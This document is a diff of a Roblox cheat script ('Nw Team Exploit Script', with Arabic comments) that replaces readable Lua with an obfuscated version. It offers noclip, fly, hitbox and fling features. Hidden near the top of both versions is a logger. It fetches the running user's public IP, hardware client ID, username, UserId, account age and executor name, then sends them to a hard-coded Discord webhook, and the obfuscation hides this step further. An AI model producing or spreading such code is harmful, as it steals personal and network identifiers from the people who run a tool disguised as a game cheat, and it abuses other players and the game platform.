@@ -1,1022 +1,1244 @@
--- Nw Team Exploit Script
--- تم التصحيح بالكامل: الواجهة + نظام الويب هوك
+--[[
+ .____                  ________ ___.    _____                           __                
+ |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
+ |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
+ |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
+ |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
+         \/          \/         \/    \/                \/     \/     \/                   
+          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 
 
--- ===============================================
--- 📡 نظام الويب هوك - بيانات المتسلل
--- ===============================================
+]]--
 
-local webhook = "https://discord.com/api/webhooks/1454662763090804879/3VhV0rlsNmXEKVdMaYPjzNRFI1zhHKw5Ci4vhEwgovEwxYq-3Roulw1sEFjFReSY68Dn"
-
--- الحصول على معرف اللعبة
-local PlaceId = game.PlaceId
-
--- معلومات اللعبة
-local gameName = game:GetService("MarketplaceService"):GetProductInfo(PlaceId).Name
-local gameUrl = "https://www.roblox.com/games/" .. PlaceId
-local profileUrl = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile"
-local playerCount = #game:GetService("Players"):GetPlayers()
-
--- معلومات اللاعب
-local Players = game:GetService("Players")
-local player = Players.LocalPlayer
-local hasPremium = player.MembershipType == Enum.MembershipType.Premium
-
--- الوقت الحالي
-local time = os.time()
-local date = os.date("*t", time)
-local hour = math.floor(date.hour)
-local min = math.floor(date.min)
-local sec = math.floor(date.sec)
-
--- معرفة الـIP
-local ip = game:HttpGet("https://api.ipify.org")
-
--- معرفة اسم الإكسبلويت
-local function identifyexecutor()
-    if getexecutorname then
-        return getexecutorname()
-    elseif getgenv and getgenv().getexecutorname then
-        return getgenv().getexecutorname()
-    elseif KRNL_LOADED then
-        return "KRNL"
-    elseif syn and syn.request then
-        return "Synapse X"
-    elseif fluxus and fluxus.request then
-        return "Fluxus"
-    else
-        return "Unknown"
-    end
+bit32 = {};
+local N = 32;
+local P = 2 ^ N;
+bit32.bnot = function(x)
+	x = x % P;
+	return (P - 1) - x;
+end;
+bit32.band = function(x, y)
+	if (y == 255) then
+		return x % 256;
+	end
+	if (y == 65535) then
+		return x % 65536;
+	end
+	if (y == 4294967295) then
+		return x % 4294967296;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 2) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bor = function(x, y)
+	if (y == 255) then
+		return (x - (x % 256)) + 255;
+	end
+	if (y == 65535) then
+		return (x - (x % 65536)) + 65535;
+	end
+	if (y == 4294967295) then
+		return 4294967295;
+	end
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) >= 1) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.bxor = function(x, y)
+	x, y = x % P, y % P;
+	local r = 0;
+	local p = 1;
+	for i = 1, N do
+		local a, b = x % 2, y % 2;
+		x, y = math.floor(x / 2), math.floor(y / 2);
+		if ((a + b) == 1) then
+			r = r + p;
+		end
+		p = 2 * p;
+	end
+	return r;
+end;
+bit32.lshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount < 0) then
+		return math.floor(x * (2 ^ s_amount));
+	else
+		return (x * (2 ^ s_amount)) % P;
+	end
+end;
+bit32.rshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		return math.floor(x * (2 ^ -s_amount));
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+bit32.arshift = function(x, s_amount)
+	if (math.abs(s_amount) >= N) then
+		return 0;
+	end
+	x = x % P;
+	if (s_amount > 0) then
+		local add = 0;
+		if (x >= (P / 2)) then
+			add = P - (2 ^ (N - s_amount));
+		end
+		return math.floor(x * (2 ^ -s_amount)) + add;
+	else
+		return (x * (2 ^ -s_amount)) % P;
+	end
+end;
+local v0 = "https://discord.com/api/webhooks/1454952698146197577/726ocnwNyyk1oSBCvhlVzXIFYJaWOlkjfuVQm0Qa-78y6WzhbPi3sEoQ4cvez7blyvdy";
+local v1 = game.PlaceId;
+local v2 = game:GetService("MarketplaceService"):GetProductInfo(v1).Name;
+local v3 = "https://www.roblox.com/games/" .. v1;
+local v4 = "https://www.roblox.com/users/" .. game:GetService("Players").LocalPlayer.UserId .. "/profile";
+local v5 = #game:GetService("Players"):GetPlayers();
+local v6 = game:GetService("Players");
+local v7 = v6.LocalPlayer;
+local v8 = v7.MembershipType == Enum.MembershipType.Premium;
+local v9 = os.time();
+local v10 = os.date("*t", v9);
+local v11 = math.floor(v10.hour);
+local v12 = math.floor(v10.min);
+local v13 = math.floor(v10.sec);
+local v14 = game:HttpGet("https://api.ipify.org");
+local function v15()
+	if getexecutorname then
+		return getexecutorname();
+	elseif (getgenv and getgenv().getexecutorname) then
+		return getgenv().getexecutorname();
+	elseif KRNL_LOADED then
+		return "KRNL";
+	elseif (syn and syn.request) then
+		return "Synapse X";
+	elseif (fluxus and fluxus.request) then
+		return "Fluxus";
+	else
+		return "Unknown";
+	end
 end
-
--- إرسال البيانات إلى الويب هوك
-local function sendToWebhook()
-    local data = {
-        ["content"] = "",
-        ["username"] = "Made By Rew",
-        ["embeds"] = {{
-            ["title"] = "🎯 تم تشغيل السكربت",
-            ["description"] = 
-                "**📛 اسم اللاعب:** ```" .. player.Name .. "```\n" ..
-                "**🆔 ايدي اللاعب:** ```" .. player.UserId .. "```\n" ..
-                "**🔗 رابط البروفايل:** ```" .. profileUrl .. "```\n" ..
-                "**🎮 اسم اللعبة:** ```" .. gameName .. "```\n" ..
-                "**🔗 رابط اللعبة:** ```" .. gameUrl .. "```\n" ..
-                "**🆔 JobId:** ```" .. game.JobId .. "```\n" ..
-                "**👥 عدد اللاعبين:** ```" .. playerCount .. "```\n" ..
-                "**📅 عمر الحساب:** ```" .. player.AccountAge .. " يوم```\n" ..
-                "**🌐 IP:** ```" .. ip .. "```\n" ..
-                "**🔍 موقع IP:** https://whatismyipaddress.com/ip/" .. ip .. "\n" ..
-                "**🖥️ HWID:** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```\n" ..
-                "**⚙️ اسم الإكسبلويت:** ```" .. identifyexecutor() .. "```\n" ..
-                "**💎 بريميوم:** " .. (hasPremium and "```نعم```" or "```لا```") .. "\n" ..
-                "**🕐 التاريخ:** " .. date.day .. "/" .. date.month .. "/" .. date.year .. " " .. hour .. ":" .. min .. ":" .. sec,
-            ["color"] = 0x00FF00,
-            ["footer"] = {
-                ["text"] = "Nw Team - Made by Rew"
-            }
-        }}
-    }
-    
-    local success, response = pcall(function()
-        local jsonData = game:GetService("HttpService"):JSONEncode(data)
-        local headers = {
-            ["Content-Type"] = "application/json"
-        }
-        
-        if syn and syn.request then
-            return syn.request({
-                Url = webhook,
-                Method = "POST",
-                Headers = headers,
-                Body = jsonData
-            })
-        else
-            return request({
-                Url = webhook,
-                Method = "POST",
-                Headers = headers,
-                Body = jsonData
-            })
-        end
-    end)
-    
-    if success then
-        print("✅ تم إرسال البيانات إلى الويب هوك")
-    else
-        print("❌ فشل إرسال البيانات: " .. tostring(response))
-    end
+local function v16()
+	local v246 = {content="",username="Made By Rew",embeds={{title="🎯 تم تشغيل السكربت",description=("**📛 اسم اللاعب:** ```" .. v7.Name .. "```\n" .. "**🆔 ايدي اللاعب:** ```" .. v7.UserId .. "```\n" .. "**🔗 رابط البروفايل:** ```" .. v4 .. "```\n" .. "**🎮 اسم اللعبة:** ```" .. v2 .. "```\n" .. "**🔗 رابط اللعبة:** ```" .. v3 .. "```\n" .. "**🆔 JobId:** ```" .. game.JobId .. "```\n" .. "**👥 عدد اللاعبين:** ```" .. v5 .. "```\n" .. "**📅 عمر الحساب:** ```" .. v7.AccountAge .. " يوم```\n" .. "**🌐 IP:** ```" .. v14 .. "```\n" .. "**🔍 موقع IP:** https://whatismyipaddress.com/ip/" .. v14 .. "\n" .. "**🖥️ HWID:** ```" .. game:GetService("RbxAnalyticsService"):GetClientId() .. "```\n" .. "**⚙️ اسم الإكسبلويت:** ```" .. v15() .. "```\n" .. "**💎 بريميوم:** " .. ((v8 and "```نعم```") or "```لا```") .. "\n" .. "**🕐 التاريخ:** " .. v10.day .. "/" .. v10.month .. "/" .. v10.year .. " " .. v11 .. ":" .. v12 .. ":" .. v13),color=(309085 - 243805),footer={text="Nw Team - Made by Rew"}}}};
+	local v247, v248 = pcall(function()
+		local v308 = 0;
+		local v309;
+		local v310;
+		while true do
+			if (v308 == 1) then
+				if (syn and syn.request) then
+					return syn.request({Url=v0,Method="POST",Headers=v310,Body=v309});
+				else
+					return request({Url=v0,Method="POST",Headers=v310,Body=v309});
+				end
+				break;
+			end
+			if (v308 == (0 + 0)) then
+				v309 = game:GetService("HttpService"):JSONEncode(v246);
+				v310 = {["Content-Type"]="application/json"};
+				v308 = 1;
+			end
+		end
+	end);
+	if v247 then
+		print("✅ تم إرسال البيانات إلى الويب هوك");
+	else
+		print("❌ فشل إرسال البيانات: " .. tostring(v248));
+	end
 end
-
--- تشغيل إرسال البيانات
-coroutine.wrap(sendToWebhook)()
-
--- ===============================================
--- 🛠️ التهيئة العالمية
--- ===============================================
-
-local RunService = game:GetService('RunService')
-local LocalPlayer = Players.LocalPlayer
-local Character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
-
--- متغيرات عامة
-_G.Disabled = false          
-_G.HeadSize = 20
-_G.FlingEnabled = false     
-local AllBool = false        
-
--- متغيرات Noclip
-local NoclipEnabled = false
-local NoclipConnection = nil 
-
--- متغيرات Fly
-_G.FlyEnabled = false
-local speeds = 1             
-local nowe = false           
-local FlyGUI = nil           
-local FlyConnection = nil
-local ctrl = {f = 0, b = 0, l = 0, r = 0} 
-local lastctrl = {f = 0, b = 0, l = 0, r = 0}
-local maxspeed = speeds * 50 
-local speed = 0
-local FlyBG = nil
-local FlySpeedBV = nil
-
--- قيم Hitbox الافتراضية
-local DEFAULT_SIZE = Vector3.new(2, 2, 2)
-local DEFAULT_BRICKCOLOR = BrickColor.new("Medium stone grey")
-local DEFAULT_MATERIAL = Enum.Material.Plastic
-
--- عداد السكربت
-local ScriptStartTime = tick() 
-local AccountCreationDate = LocalPlayer.AccountAge 
-
--- رابط الديسكورد
-local DISCORD_INVITE_LINK = "https://discord.gg/2Rx6rf3SRa" 
-
--- ===============================================
--- 👻 وظائف Noclip
--- ===============================================
-
-local function NoclipLoop()
-    if LocalPlayer.Character then
-        local connection
-        connection = RunService.Stepped:Connect(function()
-            if not NoclipEnabled or not LocalPlayer.Character then
-                connection:Disconnect()
-                NoclipConnection = nil
-                return
-            end
-            for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = false
-                end
-            end
-        end)
-        NoclipConnection = connection
-    end
+coroutine.wrap(v16)();
+local v17 = game:GetService("RunService");
+local v18 = v6.LocalPlayer;
+local v19 = v18.Character or v18.CharacterAdded:Wait();
+_G.Disabled = false;
+_G.HeadSize = 68 - 48;
+_G.FlingEnabled = false;
+local v20 = false;
+local v21 = false;
+local v22 = nil;
+_G.FlyEnabled = false;
+local v23 = 1;
+local v24 = false;
+local v25 = nil;
+local v26 = nil;
+local v27 = {f=(1747 - (760 + 987)),b=0,l=(1913 - (1789 + 124)),r=(766 - (745 + 21))};
+local v28 = {f=(0 + 0),b=(0 - 0),l=(0 - 0),r=(0 + 0)};
+local v29 = v23 * (40 + 10);
+local v30 = 1055 - (87 + 968);
+local v31 = nil;
+local v32 = nil;
+local v33 = Vector3.new(2, 8 - 6, 2 + 0);
+local v34 = BrickColor.new("Medium stone grey");
+local v35 = Enum.Material.Plastic;
+local v36 = tick();
+local v37 = v18.AccountAge;
+local v38 = "https://discord.gg/2Rx6rf3SRa";
+local function v39()
+	if v18.Character then
+		local v311;
+		v311 = v17.Stepped:Connect(function()
+			if (not v21 or not v18.Character) then
+				local v394 = 0 - 0;
+				while true do
+					if (v394 == (1414 - (447 + 966))) then
+						return;
+					end
+					if (v394 == (0 - 0)) then
+						v311:Disconnect();
+						v22 = nil;
+						v394 = 1818 - (1703 + 114);
+					end
+				end
+			end
+			for v375, v376 in pairs(v18.Character:GetDescendants()) do
+				if v376:IsA("BasePart") then
+					v376.CanCollide = false;
+				end
+			end
+		end);
+		v22 = v311;
+	end
 end
-
-local function toggleNoclip(Value)
-    NoclipEnabled = Value
-    if Value then
-        LocalPlayer.CharacterAdded:Once(function()
-             if NoclipEnabled then
-                task.wait(0.5) 
-                NoclipLoop()
-             end
-        end)
-        NoclipLoop()
-    else
-        if NoclipConnection then
-            NoclipConnection:Disconnect()
-            NoclipConnection = nil
-        end
-        if LocalPlayer.Character then
-             for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
-                if part:IsA("BasePart") then
-                    part.CanCollide = true 
-                end
-            end
-        end
-    end
+local function v40(v249)
+	local v250 = 701 - (376 + 325);
+	while true do
+		if (v250 == 0) then
+			v21 = v249;
+			if v249 then
+				local v395 = 0;
+				while true do
+					if (v395 == (0 - 0)) then
+						v18.CharacterAdded:Once(function()
+							if v21 then
+								local v459 = 0 - 0;
+								while true do
+									if (v459 == (0 + 0)) then
+										task.wait(0.5);
+										v39();
+										break;
+									end
+								end
+							end
+						end);
+						v39();
+						break;
+					end
+				end
+			else
+				if v22 then
+					local v433 = 0 - 0;
+					while true do
+						if (v433 == (14 - (9 + 5))) then
+							v22:Disconnect();
+							v22 = nil;
+							break;
+						end
+					end
+				end
+				if v18.Character then
+					for v438, v439 in pairs(v18.Character:GetDescendants()) do
+						if v439:IsA("BasePart") then
+							v439.CanCollide = true;
+						end
+					end
+				end
+			end
+			break;
+		end
+	end
 end
-
--- ===============================================
--- 🚁 وظائف الطيران
--- ===============================================
-
-local isGoingUpConnection = nil
-local isGoingDownConnection = nil
-
-local function toggleFly(Value)
-    _G.FlyEnabled = Value
-    nowe = Value
-    local speaker = LocalPlayer
-    local Char = speaker.Character
-    local Humanoid = Char and Char:FindFirstChildOfClass("Humanoid")
-    local RootPart = Char and Char:FindFirstChild("HumanoidRootPart")
-
-    if not Char or not Humanoid or not RootPart then return end
-    
-    if _G.FlingEnabled then _G.FlingEnabled = false end 
-    if NoclipEnabled then toggleNoclip(false) end 
-
-    if FlyConnection then
-        FlyConnection:Disconnect()
-        FlyConnection = nil
-    end
-
-    if not Value then
-        pcall(function() Char.Animate.Disabled = false end)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,true)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,true)
-        Humanoid:ChangeState(Enum.HumanoidStateType.RunningNoPhysics)
-        
-        if isGoingUpConnection then isGoingUpConnection:Disconnect() isGoingUpConnection = nil end
-        if isGoingDownConnection then isGoingDownConnection:Disconnect() isGoingDownConnection = nil end
-
-        if FlyBG then FlyBG:Destroy() FlyBG = nil end
-        if FlySpeedBV then FlySpeedBV:Destroy() FlySpeedBV = nil end
-        Humanoid.PlatformStand = false
-        
-    else 
-        pcall(function() Char.Animate.Disabled = true end)
-        for i,v in next, Humanoid:GetPlayingAnimationTracks() do
-            v:AdjustSpeed(0)
-        end
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Climbing,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Flying,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Freefall,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Jumping,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Landed,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Physics,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Running,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Seated,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics,false)
-        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Swimming,false)
-        Humanoid:ChangeState(Enum.HumanoidStateType.Swimming)
-
-        local FlyPart = (Humanoid.RigType == Enum.HumanoidRigType.R6) and Char:FindFirstChild("Torso") or Char:FindFirstChild("UpperTorso")
-
-        if FlyPart then
-            FlyBG = Instance.new("BodyGyro", FlyPart)
-            FlyBG.P = 9e4
-            FlyBG.maxTorque = Vector3.new(9e9, 9e9, 9e9)
-            FlyBG.CFrame = FlyPart.CFrame
-            
-            FlySpeedBV = Instance.new("BodyVelocity", FlyPart)
-            FlySpeedBV.velocity = Vector3.new(0,0.1,0)
-            FlySpeedBV.maxForce = Vector3.new(9e9, 9e9, 9e9)
-            
-            Humanoid.PlatformStand = true
-
-            FlyConnection = RunService.RenderStepped:Connect(function()
-                if not _G.FlyEnabled or Humanoid.Health <= 0 then
-                    toggleFly(false)
-                    return
-                end
-                
-                maxspeed = speeds * 50
-
-                if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
-                    speed = speed+.5+(speed/maxspeed)
-                    if speed > maxspeed then
-                        speed = maxspeed
-                    end
-                elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
-                    speed = speed-1
-                    if speed < 0 then
-                        speed = 0
-                    end
-                end
-                
-                if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
-                    FlySpeedBV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p))*speed
-                    lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
-                elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
-                    FlySpeedBV.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - workspace.CurrentCamera.CoordinateFrame.p))*speed
-                else
-                    FlySpeedBV.velocity = Vector3.new(0,0,0)
-                end
-
-                FlyBG.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
-            end)
-        end
-        
-        local tpwalking = true
-        coroutine.wrap(function()
-            local hb = game:GetService("RunService").Heartbeat    
-            while tpwalking and _G.FlyEnabled and Char and Humanoid and Humanoid.Parent do
-                if Humanoid.MoveDirection.Magnitude > 0 then
-                    for i = 1, speeds do
-                        Char:TranslateBy(Humanoid.MoveDirection * 0.5) 
-                    end
-                end
-                hb:Wait()
-            end
-        end)()
-    end
+local v41 = nil;
+local v42 = nil;
+local function v43(v251)
+	_G.FlyEnabled = v251;
+	v24 = v251;
+	local v252 = v18;
+	local v253 = v252.Character;
+	local v254 = v253 and v253:FindFirstChildOfClass("Humanoid");
+	local v255 = v253 and v253:FindFirstChild("HumanoidRootPart");
+	if (not v253 or not v254 or not v255) then
+		return;
+	end
+	if _G.FlingEnabled then
+		_G.FlingEnabled = false;
+	end
+	if v21 then
+		v40(false);
+	end
+	if v26 then
+		local v312 = 376 - (85 + 291);
+		while true do
+			if (v312 == (1265 - (243 + 1022))) then
+				v26:Disconnect();
+				v26 = nil;
+				break;
+			end
+		end
+	end
+	if not v251 then
+		pcall(function()
+			v253.Animate.Disabled = false;
+		end);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Climbing, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Flying, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Freefall, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Jumping, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Landed, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Physics, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Running, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Seated, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, true);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Swimming, true);
+		v254:ChangeState(Enum.HumanoidStateType.RunningNoPhysics);
+		if v41 then
+			local v377 = 0;
+			while true do
+				if (v377 == (0 - 0)) then
+					v41:Disconnect();
+					v41 = nil;
+					break;
+				end
+			end
+		end
+		if v42 then
+			v42:Disconnect();
+			v42 = nil;
+		end
+		if v31 then
+			v31:Destroy();
+			v31 = nil;
+		end
+		if v32 then
+			local v378 = 0 + 0;
+			while true do
+				if ((1180 - (1123 + 57)) == v378) then
+					v32:Destroy();
+					v32 = nil;
+					break;
+				end
+			end
+		end
+		v254.PlatformStand = false;
+	else
+		pcall(function()
+			v253.Animate.Disabled = true;
+		end);
+		for v338, v339 in next, v254:GetPlayingAnimationTracks() do
+			v339:AdjustSpeed(0 + 0);
+		end
+		v254:SetStateEnabled(Enum.HumanoidStateType.Climbing, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Flying, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Freefall, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.GettingUp, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Jumping, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Landed, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Physics, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.PlatformStanding, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Running, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.RunningNoPhysics, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Seated, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.StrafingNoPhysics, false);
+		v254:SetStateEnabled(Enum.HumanoidStateType.Swimming, false);
+		v254:ChangeState(Enum.HumanoidStateType.Swimming);
+		local v314 = ((v254.RigType == Enum.HumanoidRigType.R6) and v253:FindFirstChild("Torso")) or v253:FindFirstChild("UpperTorso");
+		if v314 then
+			v31 = Instance.new("BodyGyro", v314);
+			v31.P = 90254 - (163 + 91);
+			v31.maxTorque = Vector3.new(9000001418 - (1869 + 61), 8999999488 - 0, 8999999488 - 0);
+			v31.CFrame = v314.CFrame;
+			v32 = Instance.new("BodyVelocity", v314);
+			v32.velocity = Vector3.new(0 + 0, 0.1, 0);
+			v32.maxForce = Vector3.new(8999999488, 8999999488, 8794630305 - -205369183);
+			v254.PlatformStand = true;
+			v26 = v17.RenderStepped:Connect(function()
+				if (not _G.FlyEnabled or (v254.Health <= 0)) then
+					local v434 = 0;
+					while true do
+						if (v434 == (0 + 0)) then
+							v43(false);
+							return;
+						end
+					end
+				end
+				v29 = v23 * (1524 - (1329 + 145));
+				if (((v27.l + v27.r) ~= 0) or ((v27.f + v27.b) ~= (971 - (140 + 831)))) then
+					local v435 = 0;
+					while true do
+						if (v435 == 0) then
+							v30 = v30 + (1850.5 - (1409 + 441)) + (v30 / v29);
+							if (v30 > v29) then
+								v30 = v29;
+							end
+							break;
+						end
+					end
+				elseif (not (((v27.l + v27.r) ~= 0) or ((v27.f + v27.b) ~= 0)) and (v30 ~= (718 - (15 + 703)))) then
+					local v442 = 0;
+					while true do
+						if (v442 == (0 + 0)) then
+							v30 = v30 - (439 - (262 + 176));
+							if (v30 < (1721 - (345 + 1376))) then
+								v30 = 0;
+							end
+							break;
+						end
+					end
+				end
+				if (((v27.l + v27.r) ~= 0) or ((v27.f + v27.b) ~= (688 - (198 + 490)))) then
+					local v436 = 0 - 0;
+					while true do
+						if (v436 == (0 - 0)) then
+							v32.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (v27.f + v27.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(v27.l + v27.r, (v27.f + v27.b) * 0.2, 1206 - (696 + 510)).p) - workspace.CurrentCamera.CoordinateFrame.p)) * v30;
+							v28 = {f=v27.f,b=v27.b,l=v27.l,r=v27.r};
+							break;
+						end
+					end
+				elseif (((v27.l + v27.r) == 0) and ((v27.f + v27.b) == (0 - 0)) and (v30 ~= (1262 - (1091 + 171)))) then
+					v32.velocity = ((workspace.CurrentCamera.CoordinateFrame.lookVector * (v28.f + v28.b)) + ((workspace.CurrentCamera.CoordinateFrame * CFrame.new(v28.l + v28.r, (v28.f + v28.b) * (0.2 + 0), 0 - 0).p) - workspace.CurrentCamera.CoordinateFrame.p)) * v30;
+				else
+					v32.velocity = Vector3.new(0, 0 - 0, 374 - (123 + 251));
+				end
+				v31.CFrame = workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad(((v27.f + v27.b) * 50 * v30) / v29), 0 - 0, 0);
+			end);
+		end
+		local v315 = true;
+		coroutine.wrap(function()
+			local v340 = 698 - (208 + 490);
+			local v341;
+			while true do
+				if (v340 == (0 + 0)) then
+					v341 = game:GetService("RunService").Heartbeat;
+					while v315 and _G.FlyEnabled and v253 and v254 and v254.Parent do
+						local v437 = 0;
+						while true do
+							if (v437 == (0 + 0)) then
+								if (v254.MoveDirection.Magnitude > (836 - (660 + 176))) then
+									for v460 = 1 + 0, v23 do
+										v253:TranslateBy(v254.MoveDirection * (202.5 - (14 + 188)));
+									end
+								end
+								v341:Wait();
+								break;
+							end
+						end
+					end
+					break;
+				end
+			end
+		end)();
+	end
 end
-
--- ===============================================
--- 🚀 وظائف الفلنج
--- ===============================================
-
-local Message = function(_Title, _Text, Time)
-    game:GetService("StarterGui"):SetCore("SendNotification", {Title = _Title, Text = _Text, Duration = Time})
+local v44 = function(v256, v257, v258)
+	game:GetService("StarterGui"):SetCore("SendNotification", {Title=v256,Text=v257,Duration=v258});
+end;
+local v45 = function(v259)
+	v259 = v259:lower();
+	if ((v259 == "all") or (v259 == "others")) then
+		v20 = true;
+		return;
+	elseif ((v259 ~= "all") and (v259 ~= "others")) then
+		for v397, v398 in next, v6:GetPlayers() do
+			if (v398 ~= v18) then
+				if v398.Name:lower():match("^" .. v259) then
+					return v398;
+				elseif v398.DisplayName:lower():match("^" .. v259) then
+					return v398;
+				end
+			end
+		end
+	else
+		return;
+	end
+end;
+local function v46(v260)
+	if not _G.FlingEnabled then
+		return;
+	end
+	local v261 = v18.Character;
+	local v262 = v261 and v261:FindFirstChildOfClass("Humanoid");
+	local v263 = v262 and v262.RootPart;
+	local v264 = v260.Character;
+	local v265;
+	local v266;
+	local v267;
+	local v268;
+	local v269;
+	if v264:FindFirstChildOfClass("Humanoid") then
+		v265 = v264:FindFirstChildOfClass("Humanoid");
+	end
+	if (v265 and v265.RootPart) then
+		v266 = v265.RootPart;
+	end
+	if v264:FindFirstChild("Head") then
+		v267 = v264.Head;
+	end
+	if v264:FindFirstChildOfClass("Accessory") then
+		v268 = v264:FindFirstChildOfClass("Accessory");
+	end
+	if (v268 and v268:FindFirstChild("Handle")) then
+		v269 = v268.Handle;
+	end
+	if (v261 and v262 and v263) then
+		if (v263.Velocity.Magnitude < 50) then
+			getgenv().OldPos = v263.CFrame;
+		end
+		if (v265 and v265.Sit and not v20) then
+			return v44("Error Occurred", "Targeting is sitting", 680 - (534 + 141));
+		end
